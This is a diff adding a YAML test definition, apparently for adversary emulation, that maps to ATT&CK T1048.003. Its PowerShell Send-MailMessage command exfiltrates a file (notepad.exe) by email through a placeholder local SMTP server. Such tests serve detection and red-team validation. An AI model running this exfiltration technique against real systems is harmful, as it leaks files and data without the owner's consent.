@@ -1,0 +1,14 @@
+- id: 3f207226-0855-5355-ac9a-fa6ec9568764
+  name: Soumaia ART Tests - Exfiltration Over Alternative Protocol - SMTP
+  description: 'Exfiltration of specified file over SMTP.
+
+    Upon successful execution, powershell will send an email with attached file to exfiltrate to a remote address. Results will be via stdout.'
+  tactic: exfiltration
+  technique:
+    attack_id: T1048.003
+    name: 'Exfiltration Over Alternative Protocol: Exfiltration Over Unencrypted/Obfuscated Non-C2 Protocol'
+  platforms:
+    windows:
+      psh:
+        command: |-
+          Send-MailMessage -From test@corp.com -To test@corp.com -Subject "T1048.003 Atomic Test" -Attachments C:\Windows\System32\notepad.exe -SmtpServer 127.0.0.1
